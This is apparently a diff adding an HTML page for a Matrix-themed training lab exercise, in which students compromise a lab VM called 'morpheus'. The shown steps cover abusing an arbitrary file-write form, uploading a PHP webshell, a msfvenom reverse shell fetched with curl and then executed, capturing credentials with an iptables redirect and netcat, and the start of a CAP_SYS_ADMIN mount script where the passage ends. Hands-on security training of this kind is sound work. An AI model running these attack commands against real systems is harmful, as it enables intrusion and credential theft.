@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exercise: Advanced Privilege Escalation with Linux Capabilities | Abusing and Protecting Kubernetes, Linux and Containers</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Exercise: Advanced Privilege Escalation with Linux Capabilities" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:10000/exercises/morpheus-adv-privilege-escalation/" />
+<meta property="og:url" content="http://0.0.0.0:10000/exercises/morpheus-adv-privilege-escalation/" />
+<meta property="og:site_name" content="Abusing and Protecting Kubernetes, Linux and Containers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exercise: Advanced Privilege Escalation with Linux Capabilities" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Exercise: Advanced Privilege Escalation with Linux Capabilities","url":"http://0.0.0.0:10000/exercises/morpheus-adv-privilege-escalation/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:10000/feed.xml" title="Abusing and Protecting Kubernetes, Linux and Containers" /></head>
+<body><header class="site-header">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/">Abusing and Protecting Kubernetes, Linux and Containers</a>
+
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+        <div class="trigger">
+            <a class="page-link" href="/">Exercises</a>
+            <a class="page-link" href="/about/">About</a>
+            <a class="page-link" href="/help/">Help</a>
+        </div>
+      </nav>
+
+      <!-- This is the section that comes from the default minima theme -->
+      
+    </div>
+  </header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+<link rel="stylesheet" href="/assets/css/style.css">
+ <header class="post-header">
+    <h1 class="post-title">Exercise: Advanced Privilege Escalation with Linux Capabilities</h1>
+  </header>
+
+
+  <div class="post-content">
+    
+    <h2 id="before-you-start">Before you start</h2>
+
+<p>Please turn your sticker over, back to the not-yet-done side.</p>
+<p>Then start an lxterminal by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. 
+</p>
+    
+<p>Now suspend all other virtual machines:</p>
+
+<div class="language-shell highlighter-rouge"><div 
+class="highlight"><pre class="highlight">
+<code>/sync/bin/suspend-all-vms.sh </code>
+</pre></div>    </div>
+
+<p>And then start the virtual machine:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code>sudo virsh start morpheus1</code></pre></div>    </div>
+
+    
+
+    <h2 id="steps">Steps</h2>
+<ol>
+<li>
+<p>Start up a fresh <code>lxterminal</code> by clicking the &quot;sparrow&quot; logo in the bottom-left corner of the screen, clicking Run, typing <code>lxterminal</code> and hitting enter. Alternatively, use the hot key sequence below:</p>
+<pre><code>&lt;hold down Alt&gt;&lt;hit F2&gt;lxterminal&lt;HIT the enter key&gt;
+</code></pre></li>
+<li>
+<p>Portscan the <code>morpheus</code> system across all 65,536 TCP ports like so:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sT</span> <span class="nt">-p-</span> morpheus
+</code></pre></div></div>
+</li>
+<li>
+<p>Start by looking at the web server on port <code>80</code>. Start up a browser window or a new tab and browse to: <a href="http://morpheus">http://morpheus</a></p>
+</li>
+<li>
+<p>Notice on the page that it says that we are playing the character of Trinity and that &quot;Cypher&quot; has locked everyone else out of some computer's SSH access.</p>
+</li>
+<li>
+<p>There's nothing else on this page that's useful. Let's check out the other web server via this link - you'll find it's password protected.</p>
+<p><a href="http://morpheus:81">http://morpheus:81</a></p>
+</li>
+<li>
+<p>You can try guessing the password a few times, but let's proceed assuming that it can't be guessed. Let's turn our focus back to the first web server (the one on port <code>80</code>) and investigate it with <code>dirbuster</code>.</p>
+</li>
+<li>
+<p>Start up <code>dirbuster</code>.  You can type <code>dirbuster</code> into a terminal window or use the same Run method we used in step 1.</p>
+</li>
+<li>
+<p>Set the &quot;Target URL&quot; to: <a href="http://morpheus/">http://morpheus/</a></p>
+</li>
+<li>
+<p>Use the <code>directory-list-2.3-small.txt</code> wordlist:</p>
+<p>a. Click <code>dirbuster</code>'s Browse button</p>
+<p>b. Navigate to <code>/usr/share/dirbuster/wordlists</code></p>
+<p>c. Choose the file <code>directory-list-2.3-small.txt</code></p>
+</li>
+<li>
+<p>Deactivate dirbuster's &quot;Be Recursive&quot; toggle.</p>
+</li>
+<li>
+<p>Click <code>dirbuster</code>'s Start button to start the scan, then click the &quot;Results - List View&quot; tab to switch to the Results view.</p>
+</li>
+<li>
+<p>When dirbuster finds <code>/graffiti.php</code>, click <code>dirbuster</code>'s Stop button. <code>graffiti.php</code> is all we'll need.  You can exit <code>dirbuster</code> if you'd like.</p>
+</li>
+<li>
+<p>Investigate the <code>graffiti.php</code> page by visiting this page with your browser: <a href="http://morpheus/graffiti.php">http://morpheus/graffiti.php</a></p>
+</li>
+<li>
+<p>Let's enter a message onto the graffiti wall page. Type <code>TEXT</code> into the &quot;Message&quot; text box, like so:</p>
+<pre><code>TEXT
+</code></pre></li>
+<li>
+<p>Click the page's &quot;Post&quot; button to submit the line.</p>
+</li>
+<li>
+<p>Notice how your TEXT is now on the graffiti page.</p>
+</li>
+<li>
+<p>Let's view the source - hit <code>Ctrl+U</code>.</p>
+</li>
+<li>
+<p>Notice that there's a form near the end of the source code for this page.  The form submits whatever text you enter in a variable called <code>message</code>, but it also uses a hidden form field, which is a variable called <code>file</code>.  The variable's value is <code>graffiti.txt</code>.  Here's what that part of the source code looks like on our test system:</p>
+<pre><code>&lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;graffiti.txt&quot;&gt;
+</code></pre></li>
+<li>
+<p>Whenever we enter TEXT in the message block and hit the &quot;Post&quot; button, our form sends a <code>POST</code> request with these values: <code>message=TEXT&amp;file=graffiti.txt&amp;submit=submit</code>.  It seems like submitting this form might be just adding things to a file called <code>graffiti.txt</code>. Let's request <code>graffiti.txt</code> and see what's in it.  Visit this link in the browser:</p>
+<p><a href="http://morpheus/graffiti.txt">http://morpheus/graffiti.txt</a></p>
+</li>
+<li>
+<p>Notice how that file includes the line <code>TEXT</code>. Let's try asking the form to create another file called <code>vuln</code>.  Switch back to a terminal window, starting a new tab if necessary, and run this command:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s1">'message=TEXT&amp;file=vuln'</span> http://morpheus/graffiti.php
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, go back to your browser and request a file called <code>vuln</code> from the web server, via this link;</p>
+<p><a href="http://morpheus/vuln">http://morpheus/vuln</a></p>
+</li>
+<li>
+<p>Notice that you've gained the ability to append text to any file you want into this directory. Think about how you can use this to create a PHP program, or to upload one you already have, line by line.</p>
+</li>
+<li>
+<p>Create a simple PHP webshell file that we can upload, line by line. This file will be a page that checks to see if it has received a <code>GET</code> request with a variable set called <code>cmd</code>, short for &quot;command&quot;.  If it has, it will run that command via PHP's <code>shell_exec()</code> function, and display the output. Regardless of whether a command had been submitted, it will display a simple form that takes a text field called <code>cmd</code> and has a submit button. Switch back to a terminal window and copy-paste this text to create a file called <code>webshell.php</code>.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat <span class="nt">&lt;</span><span class="err">&lt;</span><span class="na">END</span> <span class="nt">&gt;</span>webshell.php
+<span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="err">\</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]))</span> <span class="p">{</span>
+   <span class="err">\</span><span class="nv">$cmd</span> <span class="o">=</span> <span class="err">\</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
+   <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
+   <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span> <span class="err">\</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">;</span>
+   <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
+   <span class="k">echo</span> <span class="s2">"------&lt;br&gt;"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"get"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;label&gt;</span>command<span class="nt">&lt;/label&gt;&lt;div&gt;&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"cmd"</span><span class="nt">&gt;&lt;/div&gt;</span>
+<span class="nt">&lt;div&gt;&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>Execute<span class="nt">&lt;/button&gt;&lt;/div&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+END
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's upload the file line by line, using the same kind of <code>curl</code> command we used earlier. We're adding the <code>-s</code> flag so that <code>curl</code> won't show us speed statistics.  We're piping any other output to <code>/dev/null</code>, to avoid seeing the page re-rendered after every single line.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>line <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>webshell.php<span class="si">)</span> <span class="p">;</span> <span class="k">do
+</span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="nv">file</span><span class="o">=</span>webshell.php<span class="se">\&amp;</span><span class="nv">message</span><span class="o">=</span><span class="nv">$line</span> <span class="se">\</span>
+   http://morpheus/graffiti.php <span class="o">&gt;</span>/dev/null
+<span class="k">done</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, go back to your browser and try out your fancy new webshell by following this link:</p>
+<p><a href="http://morpheus/webshell.php">http://morpheus/webshell.php</a></p>
+</li>
+<li>
+<p>Type <code>id</code> into the command text box and click the &quot;Execute&quot; button.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the top of the page now shows the output of a Linux <code>id</code> command.  On our test system, the output was:</p>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></li>
+<li>
+<p>This can be an inconvenient way of interacting with a shell. We'll use it to run a Meterpreter instead.  Go back to your terminal window and start a new tab by hitting <code>Ctrl-Shift-t</code>.</p>
+</li>
+<li>
+<p>Create an ELF binary meterpreter reverse shell with <code>msfvenom</code>, indicating that the meterpreter should connect back to <code>10.23.58.30</code> on port <code>4444</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">--platform</span> linux <span class="nt">-p</span> linux/x86/meterpreter/reverse_tcp <span class="se">\</span>
+   <span class="nt">-a</span> x86 <span class="nv">LHOST</span><span class="o">=</span>10.23.58.30 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-o</span> mrsbin <span class="nt">-f</span> elf
+</code></pre></div></div>
+</li>
+<li>
+<p>Now stage a simple web server here on port <code>8000</code> to serve this file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8000
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's set up a Metasploit console that can receive an inbound connection from this meterpreter. Start up a new terminal tab by hitting <code>Ctrl-Shift-t</code>.</p>
+</li>
+<li>
+<p>Start up a Metasploit console:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+</code></pre></div></div>
+</li>
+<li>
+<p>Set up a multi/handler to catch the shell.  Start by specifying <code>exploit/multi/handler</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+</code></pre></div></div>
+</li>
+<li>
+<p>Set the handler to catch the corresponding payload to the one we specified in our <code>msfvenom</code> line:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>payload linux/x86/meterpreter/reverse_tcp
+</code></pre></div></div>
+</li>
+<li>
+<p>Set the receiving host to <code>10.23.58.30</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>LHOST 10.23.58.30
+</code></pre></div></div>
+</li>
+<li>
+<p>Set <code>ExitOnSession</code> to <code>false</code>, so the handler can catch multiple incoming reverse shell connections:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>ExitOnSession <span class="nb">false</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now start the handler as a background job:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit <span class="nt">-j</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Go back to your browser, where you have that <code>webshell.php</code> form and enter the following into the command text box - this tells the receiving system to download a Meterpreter binary from your web server on port <code>8000</code> and place it into <code>/tmp/mrsbin</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-o</span> /tmp/mrsbin http://10.23.58.30:8000/mrsbin
+</code></pre></div></div>
+</li>
+<li>
+<p>Click the &quot;Execute&quot; button.</p>
+</li>
+<li>
+<p>Now enter a new command in the browser <code>webshell.php</code> form's text box - this one tells the receiving system to make the Meterpreter binary at <code>/tmp/mrsbin</code> executable and to run it.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>755 /tmp/mrsbin <span class="p">;</span> /tmp/mrsbin
+</code></pre></div></div>
+</li>
+<li>
+<p>The browser will seem to be stuck loading the page for a long time.  This is good.  If you checked out your Python web server's output, you'll see that it has logged a <code>GET</code> request from the Morpheus machine, requesting the <code>mrsbin</code> binary:</p>
+<pre><code>$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.23.58.78 - - [05/Aug/2022 02:47:40] &quot;GET /mrsbin HTTP/1.1&quot; 200 -
+</code></pre></li>
+<li>
+<p>Go check your Metasploit console. You should now see a line that reads something like &quot;Meterpreter session 1 opened…&quot;</p>
+</li>
+<li>
+<p>Interact with this new session:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions <span class="nt">-i</span> 1
+</code></pre></div></div>
+</li>
+<li>
+<p>Instruct meterpreter to give you a minimal interactive shell. You won't get any immediate feedback from the system, just a &quot;Process … created&quot; and &quot;Channel … created&quot; line from Metasploit.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+</li>
+<li>
+<p>Make the shell more interactive by starting a bash process with the <code>-i</code> flag:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>List out the contents of this directory.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>There's nothing interesting here, so change to the <code>/</code> (root) directory.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at the contents of this directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at the <code>FLAG.txt</code> file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /FLAG.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Read the hint - it says we need to figure out how to get Cypher's password, which he gave to Agent Smith so the agent could figure out where to meet Cypher. If you like, view the image this flag file mentions by visiting this link in your browser: <a href="http://morpheus/.cypher-neo.png">http://morpheus/.cypher-neo.png</a></p>
+</li>
+<li>
+<p>Remember that we saw a web server on port 81 that needed a username and password. The flag's hint seemed to indicate that Cypher's password would be necessary for Agent Smith to &quot;meet&quot; with him. Maybe Cypher's username and password will work on that web server?</p>
+</li>
+<li>
+<p>Let's try to escalate privilege and see if we can find a way to get that password. First, try doing a search for Set-UID programs:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-04000</span> <span class="nt">-xdev</span> <span class="nt">-ls</span> 2&gt;/dev/null
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that all these files are programs that are normally Set-UID, except one: <code>/usr/sbin/xtables-legacy-multi</code></p>
+</li>
+<li>
+<p><code>xtables</code> sounds like it might be similar to <code>iptables</code>, the main binary that's traditionally used to administer the kernel-based firewall on Linux systems. Check out the <code>iptables</code> binary like so:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span> <span class="sb">`</span>which iptables<span class="sb">`</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that <code>/usr/sbin/iptables</code> is a symbolic link to <code>/etc/alternatives/iptables</code>.  Check out that file path like so:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span> /etc/alternatives/iptables
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that <code>/etc/alternatives/iptables</code> is in turn a symbolic link to <code>/usr/sbin/iptables-nft</code>. Check out <code>iptables-nft</code> like so:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span> /usr/sbin/iptables-nft
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that <code>/usr/sbin/iptables-nft</code> is in turn a symbolic link to <code>/usr/sbin/xtables-nft-multi</code>. But this wasn't the file we were investigating the unusual Set-UID status on. We were looking at <code>/usr/sbin/xtables-legacy-multi</code>. Still, perhaps the <code>/usr/sbin/xtables-legacy-multi</code> program is calling <code>/usr/sbin/xtables-nft-multi</code>.</p>
+</li>
+<li>
+<p>Let's try running an <code>iptables</code> command with our current user context (<code>www-data</code>) and see if we're able to do things.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables <span class="nt">-L</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that it worked! So we can likely create a firewall rule. What if we could use it to intercept Agent Smith logging into the web server on port <code>81</code>, so we could get the password for ourselves?</p>
+</li>
+<li>
+<p>Construct a firewall rule to redirect any traffic that is headed to port <code>81</code> to port <code>9999</code> instead, where we'll set up a <code>netcat</code> listener:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+iptables <span class="nt">-t</span> nat <span class="nt">-I</span> PREROUTING <span class="nt">-p</span> tcp <span class="nt">--dport</span> 81 <span class="nt">-j</span> REDIRECT <span class="nt">--to</span> 9999
+</code></pre></div></div>
+</li>
+<li>
+<p>Set up a <code>netcat</code> listener to catch incoming traffic on port <code>9999</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 9999
+</code></pre></div></div>
+</li>
+<li>
+<p>Wait for a little bit - eventually, you'll see an HTTP request that has an <code>Authorization</code> header in it. Here's a copy of the request on our test system:</p>
+<pre><code>GET / HTTP/1.1
+Host: 172.17.0.1:81
+User-Agent: Go-http-client/1.1
+Authorization: Basic Y3lwaGVyOmNhY2hlLXByb3N5LXByb2NlZWRzLWNsdWUtZXhwaWF0ZS1hbW1vLXB1Z2lsaXN0
+Accept-Encoding: gzip
+</code></pre></li>
+<li>
+<p>When you see a request come in with an <code>Authorization: Basic</code> line, copy the rest of the line after the word &quot;Basic&quot;. The string you're looking for begins with <code>Y3lwaGV</code> and ends with <code>saXN0</code>.</p>
+</li>
+<li>
+<p>Decode the copied string with the <code>base64</code> command, like so:</p>
+<pre><code>echo &quot;THE_STRING_YOU_GOT&quot; | base64 -d ; echo &quot;&quot;
+</code></pre></li>
+<li>
+<p>Review the decoded contents of the string. They will start with <code>cypher:</code> indicating that they are credentials where the username is <code>cypher</code> and the password is the text after the colon (<code>:</code>) character.</p>
+</li>
+<li>
+<p>Copy the password - it begins with <code>cache-</code> and ends with <code>-pugilist</code>.</p>
+</li>
+<li>
+<p>Now, start a new terminal window/tab and SSH into the <code>morpheus</code> system, using the username <code>cypher</code>.  When prompted for a password, use the decoded password you just copied.</p>
+<p><em>Note: we've removed copy-paste from this shell command so you won't overwrite your copy-paste buffer (which has cypher's password in it).</em></p>
+<pre><code>ssh cypher@morpheus
+</code></pre></li>
+<li>
+<p>You've made it into the <code>morpheus</code> server! List the current directory contents in <code>cypher</code>'s home directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Look at the <code>FLAG.txt</code> file in this directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>FLAG.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the flag file challenges us to find a path to root.</p>
+</li>
+<li>
+<p>We know there aren't any other unusual Set-UID programs.  Let's see if there are any programs that grant some of root's special powers, that is, one or more capabilities. Run <code>getcap</code> to look for programs that have capabilities to grant. Do it first in the <code>/bin</code> directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/getcap <span class="nt">-r</span> /bin
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that there were none in the <code>/bin</code> directory. Now try it in the <code>/sbin</code> directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/getcap <span class="nt">-r</span> /sbin
+</code></pre></div></div>
+</li>
+<li>
+<p>There weren't any in the <code>/sbin</code> directory. Let's try <code>/usr</code> now.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/getcap <span class="nt">-r</span> /usr
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the output tells us that the <code>ping</code> program provides the <code>CAP_NET_RAW</code> capability. This is particularly instructive, since <code>ping</code> did not have Set-UID root active on this system. In the past, <code>ping</code> had to be Set-UID to allow non-root users to run it, as <code>ping</code> needs to craft packets using &quot;RAW&quot; sockets. Now, file capabilities allow anyone to run <code>ping</code>, but running <code>ping</code> only grants those users one of root's capabilities: <code>CAP_NET_RAW</code>. Should an attacker ever find a vulnerability in the <code>ping</code> command, the attacker can't get full root privilege, but simply the abilities in the <code>CAP_NET_RAW</code> capability.</p>
+</li>
+<li>
+<p>Notice that the <code>getcap</code> output also tells us that the <code>xtables-legacy-multi</code> and <code>xtables-nft-multi</code> programs grant the <code>CAP_NET_ADMIN</code> capability. Finally, the output tells us that the <code>python3-9</code> binary grants the <code>cap_sys_admin</code> capability. Let's look into this capability.</p>
+</li>
+<li>
+<p>Read the capabilities man page.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man capabilities
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the <code>CAP_SYS_ADMIN</code> entry says that it allows a program to <code>Perform a range of system administration operations including: quotactl(2), mount(2),...</code>. <code>mount</code> sounds particularly interesting.</p>
+</li>
+<li>
+<p>When the Linux man pages have a number inside parentheses, like &quot;(2)&quot;, this refers to a particular section of the man pages. Read the man page for <code>man</code> to learn what section 2 means.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man man
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that section 2 is used for <code>2 System calls (functions provided by the kernel)</code>.  So <code>CAP_SYS_ADMIN</code> doesn't give us special privilege to run the <code>mount</code> binary, but instead to use the <code>mount</code> system call.</p>
+</li>
+<li>
+<p>Take a look at the section 2 man page for mount:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man 2 mount
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the man page discusses the C-based <code>mount()</code> function.</p>
+</li>
+<li>
+<p>We need a Python program that calls <code>mount()</code>, since the <code>python3-9</code> is our path to the <code>CAP_SYS_ADMIN</code> capability. Write this program code out to a file, like so:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cat</span> <span class="o">&lt;&lt;</span><span class="n">END</span> <span class="o">&gt;</span><span class="n">mount</span><span class="p">.</span><span class="n">py</span>
+<span class="c1">#!/usr/bin/python3-9
+</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-s'</span><span class="p">,</span> <span class="s">'--source'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"src"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"source file or directory to mount on target"</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-t'</span><span class="p">,</span> <span class="s">'--target'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"target"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"target mount point"</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-f'</span><span class="p">,</span> <span class="s">'--filesystemtype'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"type"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"filesystem type - defaults to none"</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="s">"none"</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+<span class="n">item</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+
+<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">CDLL</span><span class="p">(</span><span class="s">"libc.so.6"</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">mount</span><span class="p">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">(</span><span class="n">c_char_p</span><span class="p">,</span> <span class="n">c_char_p</span><span class="p">,</span> <span class="n">c_char_p</span><span class="p">,</span> <span class="n">c_ulong</span><span class="p">,</span> <span class="n">c_char_p</span><span class="p">)</span>
+<span class="n">MS_BIND</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">source</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">item</span><span class="p">[</span><span class="s">"src"</span><span class="p">],</span><span class="s">'utf-8'</span><span class="p">)</span>
+<span class="n">target</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">item</span><span class="p">[</span><span class="s">"target"</span><span class="p">],</span> <span class="s">'utf-8'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Mounting </span><span class="si">{</span><span class="n">source</span><span class="si">}</span><span class="s"> onto </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">filesystemtype</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">item</span><span class="p">[</span><span class="s">"type"</span><span class="p">],</span><span class="s">'utf-8'</span><span class="p">)</span>
+<span class="n">options</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"rw"</span>
+<span class="n">mountflags</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">item</span><span class="p">[</span><span class="s">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"none"</span><span class="p">):</span>
+   <span class="n">mountflags</span> <span class="o">=</span> <span class="n">MS_BIND</span>
+<span class="k">else</span><span class="p">:</span>
+   <span class="n">mountflags</span> <span class="o">=</span> <span class="mi">0</span>
